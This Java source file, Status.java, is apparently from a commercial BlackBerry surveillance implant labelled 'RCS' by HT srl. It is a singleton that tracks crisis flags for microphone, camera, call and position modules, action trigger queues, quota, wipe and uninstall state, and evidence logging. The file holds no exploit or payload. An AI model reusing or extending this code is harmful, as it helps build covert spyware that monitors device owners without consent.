//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Status.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;
import java.util.Timer;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Backlight;
import blackberry.config.Globals;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.interfaces.iSingleton;
import blackberry.module.ModuleCrisis;
import blackberry.module.ModuleMic;
import blackberry.utils.BlockingQueueTrigger;

/**
 * The Class Status.
 */
public final class Status implements iSingleton {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
    //#endif

    public boolean applicationAgentFirstRun;

    /** The instance. */
    private static Status instance;

    public static boolean callistCreated;

    private static final long GUID = 0xd41c0b0acdfc3d3eL;

    Object lockCrisis = new Object();
    //Object lockTriggerAction = new Object();

    Date startingDate;

    Globals globals;

    private boolean demo = false;

    private boolean isDebug = false;

    /**
     * Gets the single instance of Status.
     * http://www.blackberry.com/knowledgecenterpublic
     * /livelink.exe/fetch/2000/348583
     * /800332/832062/How_to_-_Create_a_singleton_using_the_RuntimeStore
     * .html?nodeid=1461424&vernum=0
     * 
     * @return single instance of Status
     */
    public static synchronized Status getInstance() {
        if (instance == null) {
            instance = (Status) Singleton.self().get(GUID);
            if (instance == null) {
                final Status singleton = new Status();

                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    // Debug debug=new Debug("Status");

    /** The crisis. */
    private boolean crisis = false;

    final BlockingQueueTrigger triggeredActionsMain = new BlockingQueueTrigger(
            "Main");
    final BlockingQueueTrigger triggeredActionsFast = new BlockingQueueTrigger(
            "Fast");

    //public boolean synced;
    public boolean gprs;
    public boolean wifi;

    boolean reload;

    /**
     * Instantiates a new status.
     */
    private Status() {
        startingDate = new Date();
    }

    /**
     * Clear.
     */
    public void clear() {
        //#ifdef DEBUG
        debug.trace("Clear");
        //#endif

        triggeredActionsFast.clear();
        triggeredActionsMain.clear();

        globals = null;
        uninstall = false;
        reload = false;

        // Future compatibility.
        callistCreated = false;

    }

    private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];

    public int drift;

    public void setCrisis(int type, boolean value) {

        synchronized (lockCrisis) {
            crisisType[type] = value;
        }

        //#ifdef DEBUG
        debug.info("set crisis: " + type);
        //#endif

        if (type == ModuleCrisis.MIC) {
            final ModuleMic micAgent = (ModuleMic) ModuleMic.getInstance();
            if (micAgent != null) {
                micAgent.crisis(crisisMic());
            }
        }

    }

    public boolean callInAction() {
        final PhoneCall phoneCall = Phone.getActiveCall();
        return phoneCall != null
                && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED;
    }

    private boolean isCrisis() {
        if (Status.self().wantLight()) {
            if (crisis) {
                Debug.ledFlash(Debug.COLOR_ORANGE);
            }
        }

        synchronized (lockCrisis) {
            return crisis;
        }
    }

    public boolean crisisPosition() {
        synchronized (lockCrisis) {
            return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
        }
    }

    public boolean crisisCamera() {
        synchronized (lockCrisis) {
            return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
        }
    }

    public boolean crisisCall() {
        synchronized (lockCrisis) {
            return (isCrisis() && crisisType[ModuleCrisis.CALL]);
        }
    }

    public boolean crisisMic() {
        synchronized (lockCrisis) {
            return (isCrisis() && crisisType[ModuleCrisis.MIC]);
        }
    }

    public boolean crisisSync() {
        synchronized (lockCrisis) {
            return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
        }
    }

    /**
     * Start crisis.
     */
    public synchronized void startCrisis() {
        if (Status.self().wantLight()) {
            Debug.ledFlash(Debug.COLOR_ORANGE);
        }
        crisis = true;
    }

    /**
     * Stop crisis.
     */
    public synchronized void stopCrisis() {
        crisis = false;
    }

    //Object triggeredSemaphore = new Object();

    /**
     * Gets the action id triggered.
     * 
     * @return the action id triggered
     */
    public Trigger getTriggeredActionFast() {
        return triggeredActionsFast.getTriggeredAction();
    }

    public Trigger getTriggeredActionMain() {
        return triggeredActionsMain.getTriggeredAction();
    }

    public BlockingQueueTrigger getTriggeredQueueFast() {
        return triggeredActionsFast;
    }

    public BlockingQueueTrigger getTriggeredQueueMain() {
        return triggeredActionsMain;
    }

    public void unTriggerAll() {
        triggeredActionsFast.unTriggerAll();
        triggeredActionsMain.unTriggerAll();
    }

    public Date getStartingDate() {
        return startingDate;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetWifi(boolean newWifi) {
        boolean oldWifi = wifi;
        wifi = newWifi;
        return oldWifi;
    }

    /**
     * test-and-set instruction is an instruction used to write to a memory
     * location and return its old value as a single atomic operation
     * 
     * @param newWifi
     * @return true se wifi ha cambiato di stato
     */
    public synchronized boolean testAndSetGprs(boolean newGprs) {
        boolean oldGprs = gprs;
        gprs = newGprs;
        return oldGprs;
    }

    //#ifdef DEBUG
    int wap2Errors;
    int wap2Ok;

    public void wap2Error() {
        wap2Errors++;
        Evidence.info("Wap2 errors: " + wap2Errors + "/" + wap2Ok + " = "
                + wap2Errors * 100 / wap2Ok + "%");
    }

    public void wap2Ok() {
        wap2Ok++;
    }

    //#endif

    String currentForegroundAppName = "";

    public String getCurrentForegroundAppName() {
        return currentForegroundAppName;
    }

    String currentForegroundAppMod = "";

    public boolean uninstall;

    public String getCurrentForegroundAppMod() {
        return currentForegroundAppMod;
    }

    public void setCurrentForegroundApp(String name, String mod) {
        currentForegroundAppName = name;
        currentForegroundAppMod = mod;
    }

    public static Status self() {
        return getInstance();
    }

    Timer timer;

    public boolean firstMessageRun;

    public Timer applicationTimer;

    private Main main;

    private boolean overQuota = false;

    public static Object syncObject = new Object();

    public Timer getTimer() {
        if (timer == null) {
            timer = new Timer();
        }
        return timer;
    }

    public void renewTimer() {
        timer = new Timer();
    }

    public String statusGlobals() {
        StringBuffer buf = new StringBuffer();
        Globals g = getGlobals();
        buf.append(" quota min: " + g.quotaMin + "/" + g.getQuotaMin() + " max:" + g.quotaMax); //$NON-NLS-1$ 
        buf.append(" wipe: " + g.wipe); //$NON-NLS-1$ 
        buf.append(" type: " + g.type); //$NON-NLS-1$ 
        buf.append(" migrated: " + g.migrated); //$NON-NLS-1$ 
        buf.append(" version: " + g.version); //$NON-NLS-1$ 
        return buf.toString();
    }

    public void setGlobal(Globals g) {
        this.globals = g;
    }

    public Globals getGlobals() {
        return this.globals;
    }

    void setDemo(boolean value) {
        demo = value;
    }

    public boolean isDemo() {
        return demo;
    }

    public void setDebug(boolean value) {
        isDebug = true;
    }

    public boolean isDebug() {
        return isDebug;
    }

    public boolean wantLight() {
        return isDebug || demo;
    }

    public boolean backlightEnabled() {
        return Backlight.isEnabled();
    }

    public void setBacklight(boolean value) {
        Backlight.enable(value);
    }

    public void setMain(Main main) {
        this.main = main;
    }

    public Main getMain() {
        return this.main;
    }

    public void setOverQuota(long free, boolean over) {
        if (over != overQuota) {
            if (over) {
                //#ifdef DEBUG
                debug.fatal("not enough space. Free : " + free );
                //#endif 
                Evidence.info("Over quota START: " + free, true);
            } else {
                Evidence.info("Over quota STOP: " + free, true);
            }
        }
        this.overQuota = over;
    }

    public boolean isOverQuota() {
        return overQuota;
    }

}
